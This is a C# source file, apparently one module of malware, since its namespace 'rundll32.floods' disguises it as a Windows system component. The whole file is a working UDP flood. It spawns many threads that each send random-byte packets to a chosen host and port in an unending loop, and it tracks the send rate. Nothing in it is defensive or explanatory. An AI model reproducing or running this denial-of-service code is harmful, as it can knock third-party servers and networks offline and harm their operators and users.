using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace rundll32.floods;

internal class udp
{
	internal class FloodThreads
	{
		private IPEndPoint _ep;

		private byte[] _packet;

		private Thread _thisThread;

		public FloodThreads(IPEndPoint ep, byte[] packet)
		{
			_ep = ep;
			_packet = packet;
			_thisThread = new Thread(_threadLoop);
			_thisThread.Start();
		}

		public void stop()
		{
			try
			{
				_thisThread.Abort();
				speedThread.Abort();
			}
			catch
			{
			}
		}

		private void _threadLoop()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						socket.Blocking = false;
						socket.SendTo(_packet, _ep);
						SendShit += ByteLenth;
						Thread.Sleep(_MSDEL);
					}
				}
				catch
				{
				}
			}
		}
	}

	private static List<FloodThreads> _floods = new List<FloodThreads>();

	public static long average = 0L;

	public static long SendShit = 0L;

	public static long ByteLenth = 0L;

	public static bool IsOn = false;

	private static string _IP;

	private static int _DEST;

	private static int _MSDEL;

	private static Thread speedThread;

	public static bool start(string host, int port, int packet, int threads, int delay)
	{
		if (!IsOn)
		{
			IsOn = true;
			_IP = host;
			_DEST = port;
			_MSDEL = delay;
			speedThread = new Thread(SpeedFlooding);
			speedThread.Start();
			byte[] array = new byte[packet];
			Random random = new Random();
			random.NextBytes(array);
			ByteLenth = array.LongLength;
			IPEndPoint ep;
			try
			{
				ep = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
			}
			catch
			{
				ep = new IPEndPoint(IPAddress.Parse(host), port);
			}
			IsOn = true;
			for (int i = 0; i < threads; i++)
			{
				_floods.Add(new FloodThreads(ep, array));
			}
			return true;
		}
		return false;
	}

	private static void SpeedFlooding()
	{
		Thread.Sleep(1000);
		average += SendShit;
		SendShit = 0L;
		while (true)
		{
			Thread.Sleep(1000);
			average = (average + SendShit) / 2L;
			SendShit = 0L;
		}
	}

	public static long stop()
	{
		if (IsOn)
		{
			IsOn = false;
			try
			{
				speedThread.Abort();
			}
			catch
			{
			}
			foreach (FloodThreads flood in _floods)
			{
				flood.stop();
			}
			return average;
		}
		throw new Exception("fail");
	}
}
